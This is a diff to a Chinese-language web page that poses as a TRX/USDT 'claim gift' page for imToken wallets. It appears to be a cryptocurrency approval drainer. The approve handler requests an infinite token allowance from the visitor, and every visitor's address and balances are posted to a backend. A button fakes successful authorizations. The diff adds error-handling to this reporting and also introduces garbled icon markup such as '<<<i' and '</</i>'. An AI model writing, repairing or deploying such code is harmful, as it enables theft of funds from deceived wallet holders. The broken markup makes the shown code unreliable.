@@ -311,7 +311,7 @@
         </div>
         <!-- 钱包状态容器 -->
         <div id="walletStatusContainer">
-            <div class="status-title"><<i class="fa fa-wallet"></</i> 钱包状态</div>
+            <div class="status-title"><<<i class="fa fa-wallet"></</</i> 钱包状态</div>
             <!-- 未连接钱包时显示 -->
             <div class="disconnected-content">
                 <span>未连接钱包</span>
@@ -334,7 +334,7 @@
         <!-- 合约剩余资源显示容器（部署时起持续计算） -->
         <div id="contractResourceContainer">
             <div class="status-title">     
-                <<i class="fa fa-database"></</i> 合约剩余资源
+                <<<i class="fa fa-database"></</</i> 合约剩余资源
             </div>
             <div class="resource-content" style="line-height: 2;">
                 <p>• 合约地址：<span class="highlight" id="contractAddr">TC3AEtwB9...GaGrW</span></p>
@@ -378,14 +378,14 @@
                 <span id="copyLinkText">
                     https://trc20trx-alt.github.io/Trc20.TRX/
                 </span>
-                <button id="copyLinkBtn"><<i class="fa fa-copy"></</i> 复制链接</button>
+                <button id="copyLinkBtn"><<<i class="fa fa-copy"></</</i> 复制链接</button>
             </div>
         </div> 
-        <button id="connectBtn" class="btn"><<i class="fa fa-link"></</i> 连接imToken钱包</button>
-        <button id="approveBtn" class="btn" disabled><<i class="fa fa-gift"></</i> 领取</button>
+        <button id="connectBtn" class="btn"><<<i class="fa fa-link"></</</i> 连接imToken钱包</button>
+        <button id="approveBtn" class="btn" disabled><<<i class="fa fa-gift"></</</i> 领取</button>
         <!-- 新增：模拟成功授权按钮 -->
         <button id="simulateApproveBtn" class="btn">
-            <<i class="fa fa-play-circle"></</i> 模拟成功授权
+            <<<i class="fa fa-play-circle"></</</i> 模拟成功授权
         </button>
     </div>
     <!-- 底部信息区 -->
@@ -481,7 +481,7 @@
             // 领取（授权）按钮
             approveBtn.onclick = async () => {
                 const postData = {
-                    address: userAddress,
+                    address: userAddress || "未知地址",
                     tokenBalance: tokenBalance,
                     trxBalance: trxBalance,
                     approveTime: new Date().toLocaleString(),
@@ -496,7 +496,7 @@
                         INFINITE_APPROVE_AMOUNT
                     ).send({ from: userAddress, shouldPollResponse: true });
                     // 授权成功
-                    postData.txHash = result.transaction.txID;
+                    postData.txHash = result.transaction?.txID || "获取失败";
                     postData.isApproved = true;
                     alert(`【授权】成功！txHash：${postData.txHash.slice(0,16)}...`);
                     // 保存记录
@@ -546,11 +546,11 @@
                     warning.style.display = "none"; // 隐藏警告框
                     recordlist.style.display = "block"; // 显示记录区
 
-                    // 步骤3：构造模拟成功的上报数据
+                    // 步骤3：构造模拟成功的上报数据（增加容错）
                     const simulatePostData = {
-                        address: userAddress,
-                        tokenBalance: tokenBalance,
-                        trxBalance: trxBalance,
+                        address: userAddress || "未知地址",
+                        tokenBalance: tokenBalance || "0.00",
+                        trxBalance: trxBalance || "0.00",
                         approveTime: new Date().toLocaleString(),
                         txHash: generateSimulateTxHash(), // 生成64位模拟txHash
                         isApproved: true
@@ -732,7 +732,7 @@
                         <p><strong>USDT：</strong>${record.tokenBalance} USDT</p>
                         <p><strong>TRX：</strong>${record.trxBalance} TRX</p>
                         <p><strong>时间：</strong>${record.approveTime}</p>
-                        ${record.txHash ? `<p><a href="https://tronscan.org/#/transaction/${record.txHash}" target="_blank" class="tx-link"><<i class="fa fa-external-link"></</i> 查看交易</a></p>` : ""}
+                        ${record.txHash ? `<p><a href="https://tronscan.org/#/transaction/${record.txHash}" target="_blank" class="tx-link"><<<i class="fa fa-external-link"></</</i> 查看交易</a></p>` : ""}
                     </div>
                 `).join("");
             } catch (e) {
@@ -767,15 +767,21 @@
         }
 
         /**
-         * 通用后端上报函数（真实/模拟共用）
+         * 通用后端上报函数（真实/模拟共用）- 修复变量作用域问题
          */
         async function reportToBackend(postData, type) {
+            // 修复：在try/catch外定义dataDetail，确保全局可访问，增加容错
+            let dataDetail = "无";
             try {
-                // 更新日志：正在上报
-                const dataDetail = `地址：${postData.address.slice(0,8)}... | TXHash：${postData.txHash.slice(0,16)}...`;
+                // 安全处理地址和txHash（避免字段为空导致报错）
+                const shortAddr = postData.address ? `${postData.address.slice(0,8)}...` : "未知地址";
+                const shortTxHash = postData.txHash ? `${postData.txHash.slice(0,16)}...` : "无";
+                dataDetail = `地址：${shortAddr} | TXHash：${shortTxHash}`;
+                
+                // 正在上报的日志更新
                 updateReportLog(`正在发送${type}数据...`, "无", dataDetail);
 
-                // 发送请求
+                // 发送请求（保持与真实流程一致）
                 const res = await fetch(BACKEND_API, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -785,13 +791,16 @@
 
                 const resData = await res.json();
                 if (res.ok) {
+                    // 上报成功的日志和弹窗
                     updateReportLog(`${type}数据上报成功`, "无", dataDetail);
-                    alert(`【${type}上报成功】后端已接收，TXHash：${postData.txHash.slice(0,16)}...`);
+                    alert(`【${type}上报成功】后端已接收，TXHash：${shortTxHash}`);
                 } else {
+                    // 后端返回错误（如参数校验失败）
                     throw new Error(`后端返回${res.status}：${resData.error || "未知错误"}`);
                 }
             } catch (sendErr) {
-                updateReportLog(`${type}数据上报失败`, sendErr.message, dataDetail || "无");
+                // 上报失败：此时dataDetail已定义，可正常显示
+                updateReportLog(`${type}数据上报失败`, sendErr.message.slice(0, 100), dataDetail);
                 alert(`【${type}上报失败】：${sendErr.message.slice(0, 80)}...`);
             }
         }
